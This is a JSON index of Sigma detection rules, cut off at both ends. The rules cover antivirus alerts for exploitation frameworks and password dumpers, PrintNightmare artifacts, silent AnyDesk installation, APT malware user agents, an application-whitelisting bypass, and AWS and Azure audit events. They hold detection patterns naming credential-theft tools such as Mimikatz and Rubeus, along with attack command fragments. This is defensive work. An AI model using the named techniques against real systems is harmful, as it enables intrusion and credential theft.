\u0026#39;Meterpreter\u0026#39; - \u0026#39;Metasploit\u0026#39; - \u0026#39;PowerSploit\u0026#39; - \u0026#39;CobaltStrike\u0026#39; - \u0026#39;Swrort\u0026#39; - \u0026#39;Rozena\u0026#39; - \u0026#39;Backdoor.Cobalt\u0026#39; - \u0026#39;CobaltStr\u0026#39; - \u0026#39;COBEACON\u0026#39; - \u0026#39;Cometer\u0026#39; - \u0026#39;Razy\u0026#39; condition: selection fields: - FileName - User falsepositives: - Unlikely level: critical tags: - attack.execution - attack.t1203 - attack.command_and_control - attack.t1219 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/antivirus/av_exploiting.yml/","tags":["attack.execution","attack.t1203","attack.command_and_control","attack.t1219"],"title":"Antivirus Exploitation Framework Detection"},{"categories":null,"contents":"Detects a highly relevant Antivirus alert that reports a password dumper\nKnown false-positives Unlikely References https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ https://www.virustotal.com/gui/file/5fcda49ee7f202559a6cbbb34edb65c33c9a1e0bde9fa2af06a6f11b55ded619/detection Raw rule (edit) title: Antivirus Password Dumper Detection id: 78cc2dd2-7d20-4d32-93ff-057084c38b93 status: test description: Detects a highly relevant Antivirus alert that reports a password dumper author: Florian Roth references: - https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/ - https://www.virustotal.com/gui/file/5fcda49ee7f202559a6cbbb34edb65c33c9a1e0bde9fa2af06a6f11b55ded619/detection date: 2018/09/09 modified: 2021/11/27 logsource: product: antivirus detection: selection: Signature|contains: - \u0026#39;DumpCreds\u0026#39; - \u0026#39;Mimikatz\u0026#39; - \u0026#39;PWCrack\u0026#39; - \u0026#39;HTool/WCE\u0026#39; - \u0026#39;PSWtool\u0026#39; - \u0026#39;PWDump\u0026#39; - \u0026#39;SecurityTool\u0026#39; - \u0026#39;PShlSpy\u0026#39; - \u0026#39;Rubeus\u0026#39; - \u0026#39;Kekeo\u0026#39; - \u0026#39;LsassDump\u0026#39; - \u0026#39;Outflank\u0026#39; condition: selection fields: - FileName - User falsepositives: - Unlikely level: critical tags: - attack.credential_access - attack.t1003 - attack.t1558 - attack.t1003.001 - attack.t1003.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/antivirus/av_password_dumper.yml/","tags":["attack.credential_access","attack.t1003","attack.t1558","attack.t1003.001","attack.t1003.002"],"title":"Antivirus Password Dumper Detection"},{"categories":null,"contents":"Detects the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 .\nKnown false-positives Unlikely References https://twitter.com/mvelazco/status/1410291741241102338 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675 https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 Raw rule (edit) title: Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection id: 6fe1719e-ecdf-4caf-bffe-4f501cb0a561 status: stable description: Detects the suspicious file that is created from PoC code against Windows Print Spooler Remote Code Execution Vulnerability CVE-2021-34527 (PrinterNightmare), CVE-2021-1675 . references: - https://twitter.com/mvelazco/status/1410291741241102338 - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675 - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527 author: Sittikorn S, Nuttakorn T date: 2021/07/01 modified: 2021/11/23 tags: - attack.privilege_escalation - attack.t1055 logsource: product: antivirus detection: selection: Filename|contains: \u0026#39;C:\\Windows\\System32\\spool\\drivers\\x64\\\u0026#39; condition: selection fields: - Signature - Filename - ComputerName falsepositives: - Unlikely level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/antivirus/av_printernightmare_cve_2021_34527.yml/","tags":["attack.privilege_escalation","attack.t1055"],"title":"Antivirus PrinterNightmare CVE-2021-34527 Exploit Detection"},{"categories":null,"contents":"AnyDesk Remote Desktop silent installation can be used by attacker to gain remote access.\nKnown false-positives Legitimate deployment of AnyDesk References https://twitter.com/TheDFIRReport/status/1423361119926816776?s=20 https://support.anydesk.com/Automatic_Deployment Raw rule (edit) title: AnyDesk Silent Installation id: 114e7f1c-f137-48c8-8f54-3088c24ce4b9 status: experimental author: Ján Trenčanský date: 2021/08/06 description: AnyDesk Remote Desktop silent installation can be used by attacker to gain remote access. references: - https://twitter.com/TheDFIRReport/status/1423361119926816776?s=20 - https://support.anydesk.com/Automatic_Deployment tags: - attack.t1219 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;--install\u0026#39; - \u0026#39;--start-with-win\u0026#39; - \u0026#39;--silent\u0026#39; condition: selection falsepositives: - Legitimate deployment of AnyDesk level: high fields: - CommandLine - ParentCommandLine - CurrentDirectory ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_anydesk_silent_install.yml/","tags":["attack.t1219"],"title":"AnyDesk Silent Installation"},{"categories":null,"contents":"Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances\nKnown false-positives Rarely observed References https://www.fireeye.com/blog/threat-research/2021/09/unknown-actor-using-clfs-log-files-for-stealth.html Raw rule (edit) title: APT PRIVATELOG Image Load Pattern id: 33a2d1dd-f3b0-40bd-8baf-7974468927cc status: experimental description: Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances references: - https://www.fireeye.com/blog/threat-research/2021/09/unknown-actor-using-clfs-log-files-for-stealth.html author: Florian Roth date: 2021/09/07 logsource: category: image_load product: windows detection: selection: Image|endswith: \u0026#39;\\svchost.exe\u0026#39; ImageLoaded|endswith: \u0026#39;\\clfsw32.dll\u0026#39; condition: selection falsepositives: - Rarely observed level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_usp_svchost_clfsw32.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055"],"title":"APT PRIVATELOG Image Load Pattern"},{"categories":null,"contents":"Detects suspicious user agent strings used in APT malware in proxy logs\nKnown false-positives Old browsers References Internal Research Raw rule (edit) title: APT User Agent id: 6ec820f2-e963-4801-9127-d8b2dce4d31b status: test description: Detects suspicious user agent strings used in APT malware in proxy logs author: Florian Roth, Markus Neis references: - Internal Research date: 2019/11/12 modified: 2021/11/30 logsource: category: proxy detection: selection: c-useragent: # APT Related - \u0026#39;SJZJ (compatible; MSIE 6.0; Win32)\u0026#39; # APT Backspace - \u0026#39;Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0\u0026#39; # APT GrizzlySteppe - ChopStick - US CERT https://goo.gl/1DTHwi - \u0026#39;User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC\u0026#39; # Comment Crew Miniasp - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.4; Win32;32-bit)\u0026#39; # Comment Crew Miniasp - \u0026#39;webclient\u0026#39; # Naikon APT - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200\u0026#39; # Naikon APT - \u0026#39;Mozilla/4.0 (compatible; MSI 6.0;\u0026#39; # SnowGlobe Babar - yes, it is cut - \u0026#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0\u0026#39; # Sofacy - Xtunnel - \u0026#39;Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/\u0026#39; # Sofacy - Xtunnel - \u0026#39;Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2\u0026#39; # Sofacy - Xtunnel - \u0026#39;Mozilla/4.0\u0026#39; # Derusbi backdoor ELF https://github.com/fideliscyber/indicators/tree/master/FTA-1021 - \u0026#39;Netscape\u0026#39; # Unit78020 Malware - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\u0026#39; # Unit78020 Malware - \u0026#39;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.13) Firefox/3.6.13 GTB7.1\u0026#39; # Winnti related - \u0026#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\u0026#39; # Winnti related - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)\u0026#39; # APT17 - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; SV1)\u0026#39; # Bronze Butler - Daserf - \u0026#39;Mozilla/4.0 (compatible; MSIE 11.0; Windows NT 6.1; SV1)\u0026#39; # Bronze Butler - Daserf - \u0026#39;Mozilla/4.0 (compatible; MSIE 8.0; Win32)\u0026#39; # TSCookie https://app.any.run/tasks/0996b314-5133-491b-8d23-d431ffdec597 - \u0026#39;Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\u0026#39; # Delphi downloader https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/ - \u0026#39;Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)\u0026#39; # VPNFilter https://blog.talosintelligence.com/2018/05/VPNFilter.html - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)\u0026#39; # Sofacy User-Agent https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/ - \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko\u0026#39; # Sofacy User-Agent https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/ - \u0026#39;Mozilla v5.1 *\u0026#39; # Sofacy Zebrocy samples - \u0026#39;MSIE 8.0\u0026#39; # Sofacy Azzy Backdoor from https://www.hybrid-analysis.com/sample/a80e29c0757bee05338fd5c22a542d852ad86c477068e3eb4aacc1c3e59e2eef?environmentId=100 - \u0026#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)\u0026#39; # https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html - \u0026#39;Mozilla/4.0 (compatible; RMS)\u0026#39; # Attacks on industrial enterprises using RMS and TeamViewer https://goo.gl/GthvTw - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; DynGate)\u0026#39; # Attacks on industrial enterprises using RMS and TeamViewer https://goo.gl/GthvTw - \u0026#39;O/9.27 (W; U; Z)\u0026#39; # Cmstar https://www.virustotal.com/#/file/e4328011bb2b04abc856ccd04404c9f95d67167f6c291d343e8ffa8aa2aa2099/details - \u0026#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; Trident/5.0*\u0026#39; # KerrDown UA https://goo.gl/s2WU6o - \u0026#39;Mozilla/5.0 (Windows NT 9; *\u0026#39; # Suspicious \u0026#39;Windows NT 9\u0026#39; user agent - used by APT33 malware in 2018 - \u0026#39;hots scot\u0026#39; # Unknown iOS zero-day implant https://twitter.com/craiu/status/1176437994288484352?s=20 - \u0026#39;Mozilla/5.0 (compatible; MSIE 10.0; Windows NT)\u0026#39; # https://blog.telsy.com/meeting-powerband-the-apt33-net-powerton-variant/ - \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36\u0026#39; # Hidden Cobra malware - \u0026#39;Mozilla/5.0 (Windows NT 6.2; Win32; rv:47.0)\u0026#39; # Strong Pity loader https://twitter.com/VK_Intel/status/1264185981118406657 - \u0026#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;\u0026#39; # Mustang Panda https://insights.oem.avira.com/new-wave-of-plugx-targets-hong-kong/ - \u0026#39;Mozilla/5.0 (X11; Linux i686; rv:22.0) Firefox/22.0\u0026#39; # BackdoorDiplomacy https://www.welivesecurity.com/2021/06/10/backdoordiplomacy-upgrading-quarian-turian/ - \u0026#39;Mozilla/5.0 Chrome/72.0.3626.109 Safari/537.36\u0026#39; # SideWalk malware used by Sparkling Goblin - \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:FTS_06) Gecko/22.36.35.06 Firefox/2.0\u0026#39; # LitePower stager used by WRITE https://securelist.com/wirtes-campaign-in-the-middle-east-living-off-the-land-since-at-least-2019/105044/ condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Old browsers level: high tags: - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_ua_apt.yml/","tags":["attack.command_and_control","attack.t1071.001"],"title":"APT User Agent"},{"categories":null,"contents":"Detects suspicious user agent string of APT40 Dropbox tool\nKnown false-positives Old browsers References Internal research from Florian Roth Raw rule (edit) title: APT40 Dropbox Tool User Agent id: 5ba715b6-71b7-44fd-8245-f66893e81b3d status: test description: Detects suspicious user agent string of APT40 Dropbox tool author: Thomas Patzke references: - Internal research from Florian Roth date: 2019/11/12 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: \u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\u0026#39; r-dns: \u0026#39;api.dropbox.com\u0026#39; condition: selection fields: - c-ip - c-uri falsepositives: - Old browsers level: high tags: - attack.command_and_control - attack.t1071.001 - attack.exfiltration - attack.t1567.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_apt40.yml/","tags":["attack.command_and_control","attack.t1071.001","attack.exfiltration","attack.t1567.002"],"title":"APT40 Dropbox Tool User Agent"},{"categories":null,"contents":"The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \u0026ldquo;shortcuts\u0026rdquo; to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.\nKnown false-positives unknown References https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39 Raw rule (edit) title: Arbitrary Shell Command Execution Via Settingcontent-Ms id: 24de4f3b-804c-4165-b442-5a06a2302c7e description: The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \u0026#34;shortcuts\u0026#34; to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries. status: experimental author: Sreeman date: 2020/03/13 modified: 2021/08/09 references: - https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39 tags: - attack.t1204 - attack.t1566.001 - attack.execution - attack.initial_access logsource: product: windows service: security detection: selection: CommandLine|contains: \u0026#39;.SettingContent-ms\u0026#39; filter: FilePath|contains: \u0026#39;immersivecontrolpanel\u0026#39; condition: selection and not filter falsepositives: - unknown fields: - ParentProcess - CommandLine - ParentCommandLine level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_arbitrary_shell_execution_via_settingcontent.yml/","tags":["attack.t1204","attack.t1566.001","attack.execution","attack.initial_access"],"title":"Arbitrary Shell Command Execution Via Settingcontent-Ms"},{"categories":null,"contents":"Detects creation/modification of Assisitive Technology applications and persistence with usage of ATs\nKnown false-positives Creation of non-default, legitimate AT. References http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/ https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Atbroker.yml Raw rule (edit) title: Atbroker Registry Change id: 9577edbb-851f-4243-8c91-1d5b50c1a39b description: Detects creation/modification of Assisitive Technology applications and persistence with usage of ATs status: experimental author: Mateusz Wydra, oscd.community references: - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/ - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Atbroker.yml date: 2020/10/13 modified: 2021/05/24 tags: - attack.defense_evasion - attack.t1218 - attack.persistence - attack.t1547 logsource: category: registry_event product: windows detection: creation: TargetObject|contains: \u0026#39;Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\u0026#39; persistence: TargetObject|contains: \u0026#39;Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration\u0026#39; condition: creation or persistence falsepositives: - Creation of non-default, legitimate AT. level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_susp_atbroker_change.yml/","tags":["attack.defense_evasion","attack.t1218","attack.persistence","attack.t1547"],"title":"Atbroker Registry Change"},{"categories":null,"contents":"Detects successful installation of Atera Remote Monitoring \u0026amp; Management (RMM) agent as recently found to be used by Conti operators\nKnown false-positives Legitimate Atera agent installation References https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent Raw rule (edit) title: Atera Agent Installation id: 87261fb2-69d0-42fe-b9de-88c6b5f65a43 status: experimental description: Detects successful installation of Atera Remote Monitoring \u0026amp; Management (RMM) agent as recently found to be used by Conti operators references: - https://www.advintel.io/post/secret-backdoor-behind-conti-ransomware-operation-introducing-atera-agent date: 2021/09/01 modified: 2021/10/13 author: Bhabesh Raj level: high logsource: service: application product: windows tags: - attack.t1219 detection: selection: EventID: 1033 Provider_Name: MsiInstaller Message|contains: AteraAgent condition: selection falsepositives: - Legitimate Atera agent installation ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_software_atera_rmm_agent_install.yml/","tags":["attack.t1219"],"title":"Atera Agent Installation"},{"categories":null,"contents":"","permalink":"https://bradleyjkemp.dev/sigmadoc/attack-navigator/","tags":null,"title":"ATT\u0026CK® Navigator"},{"categories":null,"contents":"Detects attempts to record audio with arecord utility\nKnown false-positives None References https://linux.die.net/man/1/arecord https://linuxconfig.org/how-to-test-microphone-with-audio-linux-sound-architecture-alsa https://attack.mitre.org/techniques/T1123/ Raw rule (edit) title: Audio Capture id: a7af2487-9c2f-42e4-9bb9-ff961f0561d5 description: Detects attempts to record audio with arecord utility #the actual binary that arecord is using and that has to be monitored is /usr/bin/aplay author: \u0026#39;Pawel Mazur\u0026#39; status: experimental date: 2021/09/04 references: - https://linux.die.net/man/1/arecord - https://linuxconfig.org/how-to-test-microphone-with-audio-linux-sound-architecture-alsa - https://attack.mitre.org/techniques/T1123/ logsource: product: linux service: auditd detection: selection: type: EXECVE a0: - arecord a1: - \u0026#39;-vv\u0026#39; a2: - \u0026#39;-fdat\u0026#39; condition: selection tags: - attack.collection - attack.t1123 falsepositives: - None level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_audio_capture.yml/","tags":["attack.collection","attack.t1123"],"title":"Audio Capture"},{"categories":null,"contents":"Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)\nKnown false-positives Unlikely References https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404 Raw rule (edit) title: AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl id: 074e0ded-6ced-4ebd-8b4d-53f55908119d description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed) status: experimental references: - https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404 author: Julia Fomina, oscd.community date: 2020/10/06 modified: 2021/09/19 tags: - attack.defense_evasion - attack.t1216 logsource: category: process_creation product: windows detection: contains_format_pretty_arg: CommandLine|contains: - \u0026#39;format:pretty\u0026#39; - \u0026#39;format:\u0026#34;pretty\u0026#34;\u0026#39; - \u0026#39;format:\u0026#34;text\u0026#34;\u0026#39; - \u0026#39;format:text\u0026#39; image_from_system_folder: Image|startswith: - \u0026#39;C:\\Windows\\System32\\\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\\u0026#39; contains_winrm: CommandLine|contains: \u0026#39;winrm\u0026#39; condition: contains_winrm and (contains_format_pretty_arg and not image_from_system_folder) level: medium falsepositives: - Unlikely ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_winrm_awl_bypass.yml/","tags":["attack.defense_evasion","attack.t1216"],"title":"AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl"},{"categories":null,"contents":"An attempt to export an AWS EC2 instance has been detected. A VM Export might indicate an attempt to extract information from an instance.\nReferences https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport.html#export-instance Raw rule (edit) title: AWS EC2 VM Export Failure id: 54b9a76a-3c71-4673-b4b3-2edb4566ea7b status: experimental description: An attempt to export an AWS EC2 instance has been detected. A VM Export might indicate an attempt to extract information from an instance. author: Diogo Braz date: 2020/04/16 modified: 2021/08/20 references: - https://docs.aws.amazon.com/vm-import/latest/userguide/vmexport.html#export-instance logsource: product: aws service: cloudtrail detection: selection: eventName: \u0026#39;CreateInstanceExportTask\u0026#39; eventSource: \u0026#39;ec2.amazonaws.com\u0026#39; filter1: errorMessage: \u0026#39;*\u0026#39; filter2: errorCode: \u0026#39;*\u0026#39; filter3: responseElements|contains: \u0026#39;Failure\u0026#39; condition: selection and (filter1 or filter2 or filter3) level: low tags: - attack.collection - attack.t1005 - attack.exfiltration - attack.t1537 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_ec2_vm_export_failure.yml/","tags":["attack.collection","attack.t1005","attack.exfiltration","attack.t1537"],"title":"AWS EC2 VM Export Failure"},{"categories":null,"contents":"Detects possible suspicious glue development endpoint activity.\nKnown false-positives Glue Development Endpoint Activity may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. If known behavior is causing false positives, it can be exempted from the rule. References https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ https://docs.aws.amazon.com/glue/latest/webapi/API_CreateDevEndpoint.html Raw rule (edit) title: AWS Glue Development Endpoint Activity id: 4990c2e3-f4b8-45e3-bc3c-30b14ff0ed26 description: Detects possible suspicious glue development endpoint activity. author: Austin Songer @austinsonger status: experimental date: 2021/10/03 modified: 2021/10/13 references: - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ - https://docs.aws.amazon.com/glue/latest/webapi/API_CreateDevEndpoint.html logsource: product: aws service: cloudtrail detection: selection1: eventSource: glue.amazonaws.com eventName: CreateDevEndpoint selection2: eventSource: glue.amazonaws.com eventName: DeleteDevEndpoint selection3: eventSource: glue.amazonaws.com eventName: UpdateDevEndpoint condition: selection1 or selection2 or selection3 level: low tags: - attack.privilege_escalation falsepositives: - Glue Development Endpoint Activity may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_passed_role_to_glue_development_endpoint.yml/","tags":["attack.privilege_escalation"],"title":"AWS Glue Development Endpoint Activity"},{"categories":null,"contents":"Detects the modification of an EC2 snapshot\u0026rsquo;s permissions to enable access from another account\nKnown false-positives Valid change to a snapshot\u0026rsquo;s permissions References https://www.justice.gov/file/1080281/download https://attack.mitre.org/techniques/T1537/ Raw rule (edit) title: AWS Snapshot Backup Exfiltration id: abae8fec-57bd-4f87-aff6-6e3db989843d status: test description: Detects the modification of an EC2 snapshot\u0026#39;s permissions to enable access from another account author: Darin Smith date: 2021/05/17 modified: 2021/08/19 references: - https://www.justice.gov/file/1080281/download - https://attack.mitre.org/techniques/T1537/ logsource: product: aws service: cloudtrail detection: selection_source: eventSource: ec2.amazonaws.com eventName: ModifySnapshotAttribute condition: selection_source falsepositives: - Valid change to a snapshot\u0026#39;s permissions level: medium tags: - attack.exfiltration - attack.t1537 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/aws/aws_snapshot_backup_exfiltration.yml/","tags":["attack.exfiltration","attack.t1537"],"title":"AWS Snapshot Backup Exfiltration"},{"categories":null,"contents":"Identifies when a application credential is modified.\nKnown false-positives Application credential added may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Application credential added from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://www.cloud-architekt.net/auditing-of-msi-and-service-principals/ Raw rule (edit) title: Azure Application Credential Modified id: cdeef967-f9a1-4375-90ee-6978c5f23974 description: Identifies when a application credential is modified. author: Austin Songer @austinsonger status: experimental date: 2021/09/02 references: - https://www.cloud-architekt.net/auditing-of-msi-and-service-principals/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: \u0026#39;Update application - Certificates and secrets management\u0026#39; condition: selection level: medium tags: - attack.impact falsepositives: - Application credential added may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application credential added from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_app_credential_modification.yml/","tags":["attack.impact"],"title":"Azure Application Credential Modified"},{"categories":null,"contents":"Identifies when a application is deleted in Azure.\nKnown false-positives Application being deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Application deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy Raw rule (edit) title: Azure Application Deleted id: 410d2a41-1e6d-452f-85e5-abdd8257a823 description: Identifies when a application is deleted in Azure. author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#application-proxy logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - Delete application - Hard Delete application condition: selection level: medium tags: - attack.defense_evasion falsepositives: - Application being deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Application deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_application_deleted.yml/","tags":["attack.defense_evasion"],"title":"Azure Application Deleted"},{"categories":null,"contents":"Detects when a Container Registry is created or deleted.\nKnown false-positives Container Registry being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Container Registry created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 https://attack.mitre.org/matrices/enterprise/cloud/ Raw rule (edit) title: Azure Container Registry Created or Deleted id: 93e0ef48-37c8-49ed-a02c-038aab23628e description: Detects when a Container Registry is created or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/08/07 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ - https://medium.com/mitre-engenuity/att-ck-for-containers-now-available-4c2359654bf1 - https://attack.mitre.org/matrices/enterprise/cloud/ logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - MICROSOFT.CONTAINERREGISTRY/REGISTRIES/WRITE - MICROSOFT.CONTAINERREGISTRY/REGISTRIES/DELETE condition: selection level: low tags: - attack.impact falsepositives: - Container Registry being created or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Container Registry created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_container_registry_created_or_deleted.yml/","tags":["attack.impact"],"title":"Azure Container Registry Created or Deleted"},{"categories":null,"contents":"Identifies when a device in azure is no longer managed or compliant\nKnown false-positives Administrator may have forgotten to review the device. References https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#core-directory Raw rule (edit) title: Azure Device No Longer Managed or Compliant id: 542b9912-c01f-4e3f-89a8-014c48cdca7d description: Identifies when a device in azure is no longer managed or compliant author: Austin Songer @austinsonger status: experimental date: 2021/09/03 references: - https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#core-directory logsource: product: azure service: azure.activitylogs detection: selection: properties.message: - Device no longer compliant - Device no longer managed condition: selection level: medium tags: - attack.impact falsepositives: - Administrator may have forgotten to review the device. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_device_no_longer_managed_or_compliant.yml/","tags":["attack.impact"],"title":"Azure Device No Longer Managed or Compliant"},{"categories":null,"contents":"Identifies when a device or device configuration in azure is modified or deleted.\nKnown false-positives Device or device configuration being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Device or device configuration modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/active-directory/reports-monitoring/reference-audit-activities#core-directory Raw rule (edit) title: Azure Device or Configuration Modified or 